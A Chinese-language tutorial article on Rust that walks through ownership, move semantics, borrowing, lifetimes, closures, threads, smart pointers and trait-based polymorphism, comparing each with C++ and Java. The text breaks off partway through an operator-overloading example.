不可变的变量对于程序的稳定运行是有帮助的，这是一种编程“契约”，当处理契约为不可变的变量时，程序就可以稳定很多，尤其是多线程的环境下，因为不可变意味着只读不写，其他好处是，与易变对象相比，它们更易于理解和推理，并提供更高的安全性。有了这样的“契约”后，编译器也很容易在编译时查错了。这就是Rust语言的编译器的编译期可以帮你检查很多编程上的问题。

对于标识不可变的变量，在 C/C++中我们用`const` ，在Java中使用 `final` ，在 C#中使用 `readonly` ，Scala用 `val` ……（在Javascript 和Python这样的动态语言中，原始类型基本都是不可变的，而自定义类型是可变的）。

对于Rust的Shadowing，我个人觉得是比较危险的，在我的职业生涯中，这种使用同名变量（在嵌套的scope环境下）带来的bug还是很不好找的。一般来说，每个变量都应该有他最合适的名字，最好不要重名。

#### 变量的所有权

这个是Rust这个语言中比较强调的一个概念。其实，在我们的编程中，很多情况下，都是把一个对象（变量）传递过来传递过去，在传递的过程中，传的是一份复本，还是这个对象本身，也就是所谓的“传值还是传引用”的被程序员问得最多的问题。

- **传递副本（传值）**。把一个对象的复本传到一个函数中，或是放到一个数据结构容器中，可能需要出现复制的操作，这个复制对于一个对象来说，需要深度复制才安全，否则就会出现各种问题。而深度复制就会导致性能问题。
- **传递对象本身（传引用）**。传引用也就是不需要考虑对象的复制成本，但是需要考虑对象在传递后，会多个变量所引用的问题。比如：我们把一个对象的引用传给一个List或其它的一个函数，这意味着，大家对同一个对象都有控制权，如果有一个人释放了这个对象，那边其它人就遭殃了，所以，一般会采用引用计数的方式来共享一个对象。引用除了共享的问题外，还有作用域的问题，比如：你从一个函数的栈内存中返回一个对象的引用给调用者，调用者就会收到一个被释放了个引用对象（因为函数结束后栈被清了）。

这些东西在任何一个编程语言中都是必需要解决的问题，要足够灵活到让程序员可以根据自己的需要来写程序。

在C++中，如果你要传递一个对象，有这么几种方式：

- **引用或指针。**也就是不建复本，完全共享，于是，但是会出现悬挂指针（[Dangling Pointer](https://en.wikipedia.org/wiki/Dangling_pointer)）又叫野指针的问题，也就是一个指针或引用指向一块废弃的内存。为了解决这个问题，C++的解决方案是使用 `share_ptr` 这样的托管类来管理共享时的引用计数。
- **传递复本**，传递一个拷贝，需要重载对象的“拷贝构造函数”和“赋值构造函数”。
- **移动Move**。C++中，为了解决一些临时对象的构造的开销，可以使用Move操作，把一个对象的所有权移动到给另外一个对象，这个解决了C++中在传递对象时的会产生很多临时对象来影响性能的情况。

C++的这些个“神操作”，可以让你非常灵活地在各种情况下传递对象，但是也提升整体语言的复杂度。而Java直接把C/C++的指针给废了，用了更为安全的引用 ，然后为了解决多个引用共享同一个内存，内置了引用计数和垃圾回收，于是整个复杂度大大降低。对于Java要传对象的复本的话，需要定义一个通过自己构造自己的构造函数，或是通过prototype设计模式的 `clone()` 方法来进行，如果你要让Java解除引用，需要明显的把引用变量赋成 `null` 。总之，无论什么语言都需要这对象的传递这个事做好，不然，无法提供相对比较灵活编程方法。

在Rust中，Rust强化了“所有权”的概念，下面是Rust的所有者的三大铁律：

1. Rust 中的每一个值都有一个被称为其 **所有者**（owner）的变量。
2. 值有且只有一个所有者。
3. 当所有者（变量）离开作用域，这个值将被丢弃。

这意味着什么？

如果你需要传递一个对象的复本，你需要给这个对象实现 `Copy` trait ，**trait** 怎么翻译我也不知道，你可以认为是一个对象的一些特别的接口（可以用于一些对像操作上的约定，比如：`Copy` 用于复制（类型于C++的拷贝构造和赋值操作符重载），`Display` 用于输出（类似于Java的 `toString()`），还有 `Drop` 和操作符重载等等，当然，也可以是对象的方法，或是用于多态的接口定义，后面会讲）。

对于内建的整型、布尔型、浮点型、字符型、多元组都被实现了 `Copy` 所以，在进行传递的时候，会进行`memcpy` 这样的复制（bit-wise式的浅拷贝）。而对于对象来说，则不行，在Rust的编程范式中，需要使用的是 `Clone` trait。

于是，`Copy` 和 `Clone` 这两个相似而又不一样的概念就出来了，`Copy` 主要是给内建类型，或是由内建类型全是支持 `Copy` 的对象，而 `Clone` 则是给程序员自己复制对象的。嗯，这就是浅拷贝和深拷贝的差别，`Copy` 告诉编译器，我这个对象可以进行 bit-wise的复制，而 `Clone` 则是指深度拷贝。

像 `String` 这样的内部需要在堆上分布内存的数据结构，是没有实现`Copy` 的（因为内部是一个指针，所以，语义上是深拷贝，浅拷贝会招至各种bug和crash），需要复制的话，必需手动的调用其 `clone()` 方法，如果不这样的的话，当在进行函数参数传递，或是变量传递的时候，所有权一下就转移了，而之前的变量什么也不是了（这里编译器会帮你做检查有没有使用到所有权被转走的变量）。这个相当于C++的Move语义。

参看下面的示例，你可能对Rust自动转移所有权会有更好的了解（代码中有注释了，我就不多说了）。

```
// takes_ownership 取得调用函数传入参数的所有权，因为不返回，所以变量进来了就出不去了
fn takes_ownership(some_string: String) {
    println!("{}", some_string);
} // 这里，some_string 移出作用域并调用 drop 方法。占用的内存被释放

// gives_ownership 将返回值移动给调用它的函数
fn gives_ownership() -> String {
    let some_string = String::from("hello"); // some_string 进入作用域.
    some_string // 返回 some_string 并移出给调用的函数
}

// takes_and_gives_back 将传入字符串并返回该值
fn takes_and_gives_back(mut a_string: String) -> String {
    a_string.push_str(", world");
    a_string  // 返回 a_string 将所有权移出给调用的函数
}

fn main()
{
    // gives_ownership 将返回值移给 s1
    let s1 = gives_ownership();
    // 所有权转给了 takes_ownership 函数, s1 不可用了
    takes_ownership(s1);
    // 如果编译下面的代码，会出现s1不可用的错误
    // println!("s1= {}", s1);
    //                    ^^ value borrowed here after move
    let s2 = String::from("hello");// 声明s2
    // s2 被移动到 takes_and_gives_back 中, 它也将返回值移给 s3。
    // 而 s2 则不可用了。
    let s3 = takes_and_gives_back(s2);
    //如果编译下面的代码，会出现可不可用的错误
    //println!("s2={}, s3={}", s2, s3);
    //                         ^^ value borrowed here after move
    println!("s3={}", s3);
}
```

这样的 Move 的方式，在性能上和安全性上都是非常有效的，而Rust的编译器会帮你检查出使用了所有权被move走的变量的错误。而且，我们还可以从函数栈上返回对象了，如下所示：

```
fn new_person() -> Person {
    let person = Person {
        name : String::from("Hao Chen"),
        age : 44,
        sex : Sex::Male,
        email: String::from("haoel@hotmail.com"),
    };
    return person;
}

fn main() {
   let p  = new_person();
}
```

因为对象是Move走的，所以，在函数上 `new_person()` 上返回的 `Person` 对象是Move 语言，被Move到了 `main()` 函数中来，这样就没有性能上的问题了。而在C++中，我们需要把对象的Move函数给写出来才能做到。因为，C++默认是调用拷贝构造函数的，而不是Move的。

#### Owner语义带来的复杂度

Owner + Move 的语义也会带来一些复杂度。首先，如果有一个结构体，我们把其中的成员 Move 掉了，会怎么样。参看如下的代码：

```
#[derive(Debug)] // 让结构体可以使用 {:?}的方式输出
struct Person {
    name :String,
    email:String,
}

let _name = p.name; // 把结构体 Person::name Move掉
println!("{} {}", _name, p.email); //其它成员可以正常访问
println!("{:?}", p); //编译出错 "value borrowed here after partial move"
p.name = "Hao Chen".to_string(); // Person::name又有了。
println!("{:?}", p); //可以正常的编译了
```

上面这个示例，我们可以看到，结构体中的成员是可以被Move掉的，Move掉的结构实例会成为一个部分的未初始化的结构，如果需要访问整个结构体的成员，会出现编译问题。但是后面把 Person::name补上后，又可以愉快地工作了。

下面我们再看一个更复杂的示例——这个示例模拟动画渲染的场景，我们需要有两个buffer，一个是正在显示的，另一个是下一帧要显示的。

```
struct Buffer {
    buffer : String,
}

struct Render {
    current_buffer : Buffer,
    next_buffer : Buffer,
}
//实现结构体 Render 的方法
impl Render { 
    //实现 update_buffer() 方法，
    //更新buffer，把 next 更新到 current 中，再更新 next
    fn update_buffer(& mut self, buf : String) {
        self.current_buffer = self.next_buffer;
        self.next_buffer = Buffer{ buffer: buf};
    }
}
```

上面这段代码，我们写下来没什么问题，但是 Rust 编译不会让我们编译通过。它会告诉我们如下的错误：

```
error[E0507]: cannot move out of self.next_buffer which is behind a mutable reference
--> /.........../xxx.rs:18:31
|
14 | self.current_buffer = self.next_buffer;
|                          ^^^^^^^^^^^^^^^^ move occurs because self.next_buffer has type Buffer,
                                            which does not implement the Copy trait
```

编译器会提示你，`Buffer` 没有 Copy trait 方法。**但是，如果你实现了 Copy 方法后，你又不能享受 Move 带来的性能上快乐了。于是，到这里，你开始进退两难了，完全不知道取舍了**。

- Rust编译器不让我们在成员方法中把成员Move走，因为 `self` 引用就不完整了。
- Rust要我们实现 `Copy` Trait，但是我们不想要拷贝，因为我们就是想把 `next_buffer` move 到 `current_buffer` 中

我们想要同时 Move 两个变量，参数 `buf` move 到 `next_buffer` 的同时，还要把 `next_buffer` 里的东西 move 到 `current_buffer` 中。 我们需要一个“杂耍”的技能。
![img](photo/indy.gif)

这个需要动用 `std::mem::replace(&dest, src)` 函数了， 这个函数技把 `src` 的值 move 到 `dest` 中，然后把 `dest` 再返回出来（这其中使用了 unsafe 的一些底层骚操作才能完成）。Anyway，最终是这样实现的：

```
use std::mem::replace
fn update_buffer(& mut self, buf : String) { 
  self.current_buffer = replace(&mut self.next_buffer, Buffer{buffer : buf}); 
}
```

不知道你觉得这样“杂耍”的代码看上去怎么以样？我觉得可读性下降一个数量级。

#### 引用（借用）和生命周期

下面，我们来讲讲引用，因为把对象的所有权 Move 走了的情况，在一些时候肯定不合适，比如，我有一个 `compare(s1: Student, s2: Student) -> bool` 我想比较两个学生的平均份成绩， 我不想传复本，因为太慢，我也不想把所有权交进去，因为只是想计算其中的数据。这个时候，传引用就是一个比较好的选择，Rust同样支持传引用。只需要把上面的函数声明改成：`compare(s1 :&Student, s2 : &Student) -> bool` 就可以了，在调用的时候，`compare (&s1, &s2);` 与C++一致。在Rust中，这也叫“借用”（嗯，Rust发明出来的这些新术语，在语义上感觉让人更容易理解了，当然，也增加了学习的复杂度了）

##### 引用（借用）

另外，如果你要修改这个引用对象，就需要使用“可变引用”，如：`foo( s : &mut Student)` 以及 `foo( &mut s);`另外，为了避免一些数据竞争需要进行数据同步的事，Rust严格规定了——**在任意时刻，要么只能有一个可变引用，要么只能有多个不可变引用**。

这些严格的规定会导致程序员失去编程的灵活性，不熟悉Rust的程序员可能会在一些编译错误下会很崩溃，但是你的代码的稳定性也会提高，bug率也会降低。

另外，Rust为了解决“野引用”的问题，也就是说，有多个变量引用到一个对象上，还不能使用额外的引用计数来增加程序运行的复杂度。那么，Rust就要管理程序中引用的生命周期了，而且还是要在编译期管理，如果发现有引用的生命周期有问题的，就要报错。比如：

```
let r;
{
    let x = 10;
    r = &x;
}
println!("r = {}",r );
```

上面的这段代码，程序员肉眼就能看到 `x` 的作用域比 `r` 小，所以导致 `r` 在 `println()` 的时候 `r` 引用的 `x` 已经没有了。这个代码在C++中可以正常编译而且可以执行，虽然最后可以打出“内嵌作用域”的 `x` 的值，但其实这个值已经是有问题的了。而在 Rust 语言中，编译器会给出一个编译错误，告诉你，“`x` dropped here while still borrowed”，这个真是太棒了。

但是这中编译时检查的技术对于目前的编译器来说，只在程序变得稍微复杂一点，编译器的“失效引用”检查就不那么容易了。比如下面这个代码：

```
fn order_string(s1 : &str, s2 : &str) -> (&str, &str) {
    if s1.len() < s2.len() {
        return (s1, s2);
    }
    return (s2, s1);
}

let str1 = String::from("long long long long string");
let str2 = "short string";

let (long_str, short_str) = order_string(str1.as_str(), str2);

println!(" long={} nshort={} ", long_str, short_str);
```

我们有两个字符串，`str1` 和 `str2` 我们想通过函数 `order_string()` 把这两个字串符返回成 `long_str` 和 `short_str` 这样方便后面的代码进行处理。这是一段很常见的处理代码的示例。然而，你会发现，这段代码编译不过。编译器会告诉你，`order_string()` 返回的 引用类型 `&str` 需要一个 lifetime的参数 – “ expected lifetime parameter”。这是因为Rust编译无法通过观察静态代码分析返回的两个引用返回值，到底是`(s1, s2)` 还是 `(s2, s1)` ，因为这是运行时决定的。所以，返回值的两个参数的引用没法确定其生命周期到底是跟 `s1` 还是跟 `s2`，这个时候，编译器就不知道了。

##### 生命周期

如果你的代码是下面这个样子，编程器可以自己推导出来，函数 `foo()` 的参数和返回值都是一个引用，他们的生命周期是一样的，所以，也就可以编译通过。

```
fn foo (s: &mut String) -> &String {
    s.push_str("coolshell");
    s
}

let mut s = "hello, ".to_string();
println!("{}", foo(&mut s))
```

而对于传入多个引用，返回值可能是任一引用，这个时候编译器就犯糊涂了，因为不知道运行时的事，所以，就需要程序员来标注了。

```
fn long_string<'c>(s1 : &'c str, s2 : &'c str) -> (&'c str, &'c str) {
    if s1.len() > s2.len() {
        return (s1, s2);
    }
    return (s2, s1);
}
```

上述的Rust的标注语法，用个单引号加一个任意字符串来标注（`'static`除外，这是一个关键词，表示生命周期跟整个程序一样长），然后，说明返回的那两个引用的生命周期跟 `s1` 和 `s2` 的生命周期相同，这个标注的目的就是把运行时的事变成了编译时的事。于是程序就可以编译通过了。（注：你也不要以为你可以用这个技术乱写生命周期，这只是一种“去语法糖操作”，是帮助编译器理解其中的生命周期，如果违反实际生命周期，编译器也是会拒绝编译的）

这里有两个说明，

- 只要你玩引用，生命周期标识就会来了。
- Rust编译器不知道运行时会发生什么事，所以，需要你来标注声明

我感觉，你现在开始有点头晕了吧？接下来，我们让你再晕一下。比如：如果你要在结构体中玩引用，那必需要为引用声明生命周期，如下所示：

```
// 引用 ref1 和 ref2 的生命周期与结构体一致
struct Test <'life> {
    ref_int : &'life i32,
    ref_str : &'life str,
}
```

其中，生命周期标识 `'life` 定义在结构体上，被使用于其成员引用上。意思是声明规则——“**结构体的生命周期 <= 成员引用的生命周期**”

然后，如果你要给这个结构实现两个 `set` 方法，你也得带上 lifetime 标识。

```
imp<'life> Test<'life> {
    fn set_string(&mut self, s : &'life str) {
        self.ref_str = s;
    }
    fn set_int(&mut self,  i : &'life i32) {
        self.ref_int = i;
    }
}
```

在上面的这个示例中，生命周期变量 `'life` 声明在 `impl` 上，用于结构体和其方法的入参上。 意思是声明规则——“**结构体方法的“引用参数”的生命周期 >= 结构体的生命周期**”

有了这些个生命周期的标识规则后，Rust就可以愉快地检查这些规则说明，并编译代码了。

#### 闭包与所有权

这种所有权和引用的严格区分和管理，会影响到很多地方，下面我们来看一下函数闭包中的这些东西的传递。函数闭包又叫Closure，是函数式编程中一个不可或缺的东西，又被称为lambda表达式，基本上所有的高级语言都会支持。在 Rust 语言中，其闭包函数的表示是用两根竖线（| |）中间加传如参数进行定义。如下所示：

```
// 定义了一个 x + y 操作的 lambda f(x, y) = x + y;
let plus = |x: i32, y:i32| x + y; 
// 定义另一个lambda g(x) = f(x, 5)
let plus_five = |x| plus(x, 5); 
//输出
println!("plus_five(10)={}", plus_five(10) );
```

##### 函数闭包

但是一旦加上了上述的所有权这些东西后，问题就会变得复杂开来。参看下面的代码。

```
struct Person {
    name : String,
    age : u8,
}

fn main() {
    let p = Person{ name: "Hao Chen".to_string(), age : 44};
    //可以运行，因为 u8 有 Copy Trait
    let age = |p : Person| p.age; 
    // String 没有Copy Trait，所以，这里所有权就 Move 走了
    let name = |p : Person | p.name; 
    println! ("name={}, age={}" , name(p), age(p));
}
```

上面的代码无法编译通过，因为Rust编译器发现在调用 `name(p)` 的时候，`p` 的所有权被移走了。然后，我们想想，改成引用的版本，如下所示：

```
let age = |p : &Person| p.age;
let name = |p : &Person | &p.name;

println! ("name={}, age={}" , name(&p), age(&p));
```

你会现在还是无法编译，报错中说：**cannot infer an appropriate lifetime for borrow expression due to conflicting requirements**

```
error[E0495]: cannot infer an appropriate lifetime for borrow expression due to conflicting requirements
  --> src/main.rs:11:31
   |
11 |     let name = |p : &Person | &p.name;
   |                               ^^^^^^^
```

然后你开始尝试加 lifetime，用尽各种Rust的骚操作（官方Github上的[ #issue 58052](https://github.com/rust-lang/rust/issues/58052)），然后，还是无法让你的程序可以编译通过。最后，上StackOverflow 里寻找帮助，得到下面的正确写法（这个可能跟这个bug有关系：[#issue 41078](https://github.com/rust-lang/rust/issues/41078) ）。但是这样的写法，已经让简洁的代码变得面目全非。

```
//下面的声明可以正确译
let name: for<'a> fn(&'a Person) -> &'a String = |p: &Person| &p.name;
```

上面的这种lifetime的标识也是很奇葩，通过定义一个函数类型来做相关的标注，但是这个函数类型，需要用到 `for<'a>` 关键字。你可能会很confuse这个关键字不是用来做循环的吗？嗯，Rust这种重用关键字的作法，我个人觉得带来了很多不必要的复杂度。总之，这样的声明代码，我觉得基本不会有人能想得到的——“去语法糖操作太严重了，绝大多数人绝对hold不住”！

最后，我们再来看另一个问题，下面的代码无法编译通过：

```
let s = String::from("coolshell");
let take_str = || s;
println!("{}", s); //ERROR
println!("{}",  take_str()); // OK
```

Rust的编译器会告诉你，`take_str` 把 `s` 的所有权给拿走了（因为需要作成返回值）。所以，后面的输出语句就用不到了。这里意味着：

- 对于内建的类型，都实现了 `Copy` 的 trait，那么闭包执行的是 “借用”
- 对于没有实现 `Copy` 的trait，在闭包中可以调用其方法，是“借用”，但是不能当成返回值，当成返回值了就是“移动”。

虽然有了这些“通常情况下是借用的潜规则”，但是还是不能满足一些情况，所以，还要让程序员可以定义 `move` 的“明规则”。下面的代码，一个有 move 一个没有move，他们的差别也不一样。

```
//-----------借用的情况-----------
let mut num = 5;
{
    let mut add_num = |x: i32| num += x;
    add_num(5);
}
println!("num={}", num); //输出 10

//-----------Move的情况-----------
let mut num = 5;
{
    // 把 num（5）所有权给 move 到了 add_num 中，
    // 使用其成为闭包中的局部变量。
    let mut add_num = move |x: i32| num += x;
    add_num(5);
    println!("num(move)={}", num); //输出10
}
//因为i32实现了 Copy，所以，这里还可以访问
println!("num(move)={}", num); //输出5
```

真是有点头大了，int这样的类型，因为实现了Copy Trait，所以，所有权被移走后，意味着，在内嵌块中的`num` 和外层的 `num` 是两个完全不相干的变量。**但是你在读代码的时候，你的大脑可能并不会让你这么想，因为里面的那个num又没有被声明过，应该是外层的**。我个人觉得这是Rust 各种“按下葫芦起了瓢”的现象。

##### 线程闭包

通过上面的示例，我们可以看到， `move` 关键词，可以把闭包外使用到的变量给移动到闭包内，成为闭包内的一个局部变量。这种方式，在多线程的方式下可以让线程运行地更为的安全。参看如下代码：

```
let name = "CoolShell".to_string();
let t = thread::spawn(move || {
    println!("Hello, {}", name);
});
println!("wait {:?}", t.join());
```

首先，线程 `thread::spawn()` 里的闭包函数是不能带参数的，因为是闭包，所以可以使用这个可见范围内的变量，但是，问题来了，因为是另一个线程，所以，这代表其和其它线程（如：主线程）开始共享数据了，所以，在Rust下，要求把使用到的变量给 Move 到线程内，这就保证了安全的问题—— `name` 在线程中永远不会失效，而且不会被别人改了。

你可能会有一些疑问，你会质疑到

- 一方面，这个 `name` 变量又没有声明成 `mut` 这意味着不变，没必要使用move语义也是安全的。
- 另一方面，如果我想把这个 `name` 传递到多个线程里呢？

嗯，是的，但是Rust的线程必需是 move的，不管是不是可变的，不然编译不过去。如果你想把一个变量传到多个线程中，你得创建变量的复本，也就是调用 `clone()` 方法。

```
let name = "CoolShell".to_string();
let name1 = name.clone();
let t1 = thread::spawn(move || {
    println!("Hello, {}", name.clone());
})
let t2 = thread::spawn(move || {
    println!("Hello, {}", name1.clone());
});
println!("wait t1={:?}, t2={:?}", t1.join(), t2.join());
```

然后，你说，这种clone的方式成本不是很高？设想，如果我要用多线程对一个很大的数组做统计，这种clone的方式完全吃不消。嗯，是的。这个时候，需要使用另一个技术，智能指针了。

#### Rust的智能指针

如果你看到这里还不晕的话，那么，我的文章还算成功（如果晕的话，请告诉我，我会进行改善）。接下来我们来讲讲Rust的智能指针和多态。

因为有些内存需要分配在Heap（堆）上，而不是Stack（堆）上，Stack上的内存一般是编译时决定的，所以，编译器需要知道你的数组、结构体、枚举等这些数据类型的长度，没有长度是无法编译的，而且长度也不能太大，Stack上的内存大小是有限，太大的内存会有StackOverflow的错误。所以，对于更大的内存或是动态的内存分配需要分配在Heap上。学过C/C++的同学对于这个概念不会陌生。

Rust 作为一个内存安全的语言，这个堆上分配的内存也是需要管理的。在C中，需要程序员自己管理，而在C++中，一般使用 [RAII 的机制](https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization)（面向对象的代理模式），一种通过分配在Stack上的对象来管理Heap上的内存的技术。在C++中，这种技术的实现叫“智能指针”（Smart Pointer）。

在C++11中，会有三种智能指针（这三种指针是什么我就不多说了）：

- `unique_ptr`。独占内存，不共享。在Rust中是：`std::boxed::Box`
- `shared_ptr`。以引用计数的方式共享内存。在Rust中是：`std::rc::Rc`
- `weak_ptr`。不以引用计数的方式共享内存。在Rust中是：`std::rc::Weak`

对于独占的 `Box` 不多说了，这里重点说一下共享的 `Rc` 和 `Weak` ：

- 对于Rust的 Rc 来说，Rc指针内会有一个 `strong_count` 的引用持计数，一旦引用计数为0后，内存就自动释放了。
- 需要共享内存的时候，需要调用实例的 `clone()` 方法。如： `let another = rc.clone()` 克隆的时候，只会增加引用计数，不会作深度复制（个人觉得Clone的语义在这里被践踏了）
- 有这种共享的引用计数，就意味着有多线程的问题，所以，如果需要使用线程安全的智能指针，则需要使用`std::sync::Arc`
- 可以使用 `Rc::downgrade(&rc)` 后，会变成 Weak 指针，Weak指针增加的是 `weak_count` 的引用计数，内存释放时不会检查它是否为 0。

我们简单的来看个示例：

```
use std::rc::Rc;
use std::rc::Weak

//声明两个未初始化的指针变量
let weak : Weak; 
let strong : Rc;
{
    let five = Rc::new(5); //局部变量
    strong = five.clone(); //进行强引用
    weak = Rc::downgrade(&five); //对局部变量进行弱引用
}
//此时，five已析构，所以 Rc::strong_count(&strong)=1， Rc::weak_count(&strong)=1
//如果调用 drop(strong)，那个整个内存就释放了
//drop(strong);

//如果要访问弱引用的值，需要把弱引用 upgrade 成强引用，才能安全的使用
match  weak_five.upgrade() {
    Some(r) => println!("{}", r),
    None => println!("None"),
} 
```

上面这个示例比较简单，其中主要展示了，指针共享的东西。因为指针是共享的，所以，对于强引用来说，最后的那个人把引用给释放了，是安全的。但是对于弱引用来说，这就是一个坑了，你们强引用的人有Ownership，但是我们弱引用没有，你们把内存释放了，我怎么知道？

于是，**在弱引用需要使用内存的时候需要“升级”成强引用 ，但是这个升级可能会不成功，因为内存可能已经被别人清空了**。所以，这个操作会返回一个 `Option` 的枚举值，`Option::Some(T)` 表示成功了，而 `Option::None` 则表示失改了。你会说，这么麻烦，我们为什么还要 `Weak` ? 这是因为强引用的 `Rc` 会有循环引用的问题……（学过C++的都应该知道）

另外，如果你要修改 `Rc` 里的值，Rust 会给你两个方法，一个是 `get_mut()`，一个是 `make_mut()` ，这两个方法都有副作用或是限制。

`get_mut()` 需要做一个“唯一引用”的检查，也就是没有任何的共享才能修改

```
//修改引用的变量 - get_mut 会返回一个Option对象
//但是需要注意，仅当（只有一个强引用 && 没有弱引用）为真才能修改
if let Some(val) = Rc::get_mut(&mut strong) {
    *val = 555;
}
```

`make_mut()` 则是会把当前的引用给clone出来，再也不共享了， 是一份全新的。

```
//此处可以修改，但是是以 clone 的方式，也就是让strong这个指针独立出来了。
*Rc::make_mut(&mut strong) = 555;
```

如果不这样做，就会出现很多内存不安全的情况。**这些小细节一定要注意，不然你的代码怎么运作的你会一脸蒙逼的**。

嗯，如果你想更快乐地使用智能指针，这里还有个选择 – `Cell` 和 `RefCell`，它们弥补了 Rust 所有权机制在灵活性上和某些场景下的不足。他们提供了 `set()`/`get()` 以及 `borrow()`/`borrow_mut()` 的方法，让你的程序更灵活，而不会被限制得死死的。参看下面的示例。

```
use std::cell::Cell;
use std::cell::RefCell

let x = Cell::new(1);
let y = &x; //引用（借用）
let z = &x; //引用（借用）
x.set(2); // 可以进行修改，x，y，z全都改了
y.set(3);
z.set(4);
println!("x={} y={} z={}", x.get(), y.get(), z.get());

let x = RefCell::new(vec![1,2,3,4]);
{
    println!("{:?}", *x.borrow())
}

{
    let mut my_ref = x.borrow_mut();
    my_ref.push(1);
}
println!("{:?}", *x.borrow());
```

通过上面的示例你可以看到你可以比较方便地更为正常的使用智能指针了。然而，需要注意的是 `Cell` 和 `RefCell` 不是线程安全的。在多线程下，需要使用Mutex进行互斥。

#### 线程与智能指针

现在，我们回来来解决前面那还没有解决的问题，就是——我想在多个线程中共享一个只读的数据，比如：一个很大的数组，我开多个线程进行并行统计。我们肯定不能对这个大数组进行clone，但也不能把这个大数组move到一个线程中。根据上述的智能指针的逻辑，我们可以通过智指指针来完成这个事，下面是一个例程：

```
const TOTAL_SIZE:usize = 100 * 1000; //数组长度
const NTHREAD:usize = 6; //线程数

let data : Vec<i32> = (1..(TOTAL_SIZE+1) as i32).collect(); //初始化一个数据从1到n数组
let arc_data = Arc::new(data); //data 的所有权转给了 ar_data
let result  = Arc::new(AtomicU64::new(0)); //收集结果的数组(原子操作)

let mut thread_handlers = vec![]; // 用于收集线程句柄

for i in 0..NTHREAD {
    // clone Arc 准备move到线程中，只增加引用计数，不会深拷贝内部数据
    let test_data = arc_data.clone(); 
    let res = result.clone(); 
    thread_handlers.push( 
        thread::spawn(move || {
            let id = i;
            //找到自己的分区
            let chunk_size = TOTAL_SIZE / NTHREAD + 1;
            let start = id * chunk_size;
            let end = std::cmp::min(start + chunk_size, TOTAL_SIZE);
            //进行求和运算
            let mut sum = 0;
            for  i in start..end  {
                sum += test_data[i];
            }
            //原子操作
            res.fetch_add(sum as u64, Ordering::SeqCst);
            println!("id={}, sum={}", id, sum );
        }
    ));
}
//等所有的线程执行完
for th in thread_handlers {
    th.join().expect("The sender thread panic!!!");
}
//输出结果
println!("result = {}",result.load(Ordering::SeqCst));
```

上面的这个例程，是用多线程的方式来并行计算一个大的数组的和，每个线程都会计算自己的那一部分。上面的代码中，

- 需要向每个线程传入一个只读的数组，我们用`Arc` 智能指针把这个数组包了一层。
- 需要向每个线程传入一个变量用于数据数据，我们用 `Arc<AtomicU64>` 包了一层。
- 注意：`Arc` 所包的对象是不可变的，所以，如果要可变的，那要么用原子对象，或是用Mutex/Cell对象再包一层。

这一些都是为了要解决“线程的Move语义后还要共享问题”。

#### 多态和运行时识别

##### 通过Trait多态

多态是抽象和解耦的关键，所以，一个高级的语言是必需实现多态的。在C++中，多态是通过虚函数表来实现的（参看《[C++的虚函数表](https://coolshell.cn/articles/12165.html)》），Rust也很类似，不过，在编程范式上，更像Java的接口的方式。其通过借用于Erlang的Trait对象的方式来完成。参看下面的代码：

```
struct Rectangle {
    width : u32,
    height : u32,
} 

struct Circle {
    x : u32,
    y : u32,
    radius : u32,
}

trait  IShape  { 
    fn area(&self) -> f32;
    fn to_string(&self) -> String;
}
```

我们有两个类，一个是“长方形”，一个是“圆形”， 还有一个 `IShape` 的trait 对象（原谅我用了Java的命名方式），其中有两个方法：求面积的 `area()` 和 转字符串的 `to_string()`。下面相关的实现：

```
impl IShape  for Rectangle {
    fn area(&self) -> f32 { (self.height * self.width) as f32 }
    fn to_string(&self) ->String {
         format!("Rectangle -> width={} height={} area={}", 
                  self.width, self.height, self.area())
    }
}

use std::f64::consts::PI;
impl IShape  for Circle  {
    fn area(&self) -> f32 { (self.radius * self.radius) as f32 * PI as f32}
    fn to_string(&self) -> String {
        format!("Circle -> x={}, y={}, area={}", 
                 self.x, self.y, self.area())
    }
}
```

于是，我们就可以有下面的多态的使用方式了（我们使用独占的智能指针类 `Box`）：

```
use std::vec::Vec;

let rect = Box::new( Rectangle { width: 4, height: 6});
let circle = Box::new( Circle { x: 0, y:0, radius: 5});
let mut v : Vec<Box> = Vec::new();
v.push(rect);
v.push(circle);

for i in v.iter() {
   println!("area={}", i.area() );
   println!("{}", i.to_string() );
}
```

##### 向下转型

但是，在C++中，多态的类型是抽象类型，我们还想把其转成实际的具体类型，在C++中叫运行进实别RTTI，需要使用像 `type_id` 或是 `dynamic_cast` 这两个技术。在Rust中，转型是使用 ‘`as`‘ 关键字，然而，这是编译时识别，不是运行时。那么，在Rust中是怎么做呢？

嗯，这里需要使用 Rust 的 `std::any::Any` 这个东西，这个东西就可以使用 `downcast_ref` 这个东西来进行具体类型的转换。于是我们要对现有的代码进行改造。

首先，先得让 `IShape` 继承于 `Any` ，并增加一个 `as_any()` 的转型接口。

```
use std::any::Any;
trait  IShape : Any + 'static  {
    fn as_any(&self) -> &dyn Any; 
    …… …… …… 
}
```

然后，在具体类中实现这个接口：

```
impl IShape  for Rectangle {
    fn as_any(&self) -> &dyn Any { self }
    …… …… …… 
}
impl IShape  for Circle  {
    fn as_any(&self) -> &dyn Any { self }
    …… …… …… 
}
```

于是，我们就可以进行运行时的向下转型了：

```
let mut v : Vec<Box<dyn IShape>> = Vec::new();
v.push(rect);
v.push(circle);
for i in v.iter() {
    if let Some(s) = i.as_any().downcast_ref::<Rectangle>() {
        println!("downcast - Rectangle w={}, h={}", s.width, s.height);
    }else if let Some(s) = i.as_any().downcast_ref::<Circle>() {
        println!("downcast - Circle x={}, y={}, r={}", s.x, s.y, s.radius);
    }else{
        println!("invaild type");
    }
}
```

#### Trait 重载操作符

操作符重载对进行泛行编程是非常有帮助的，如果所有的对象都可以进行大于，小于，等于这亲的比较操作，那么就可以直接放到一个标准的数组排序的的算法中去了。在Rust中，在 `std::ops` 下有全载的操作符重载的Trait，在`std::cmp` 下则是比较操作的操作符。我们下面来看一个示例：

假如我们有一个“员工”对象，我们想要按员工的薪水排序，如果我们想要使用`Vec::sort()`方法，我们就需要实现这个对象的各种“比较”方法。这些方法在 `std::cmp` 内—— 其中有四个Trait : `Ord`、`PartialOrd` 、`Eq` 和 `PartialEq` 。其中，`Ord` 依赖于 `PartialOrd` 和 `Eq` ，而`Eq` 依赖于 `PartialEq`，这意味着你需要实现所有的Trait，而`Eq` 这个Trait 是没有方法的，所以，其实现如下：

```
use std::cmp::{Ord, PartialOrd, PartialEq, Ordering};

#[derive(Debug)]
struct Employee {
    name : String,
    salary : i32,
}
impl Ord for Employee {
    fn cmp(&self, rhs: &Self) -> Ordering {
        self.salary.cmp(&rhs.salary)
    }
}
impl PartialOrd for Employee {
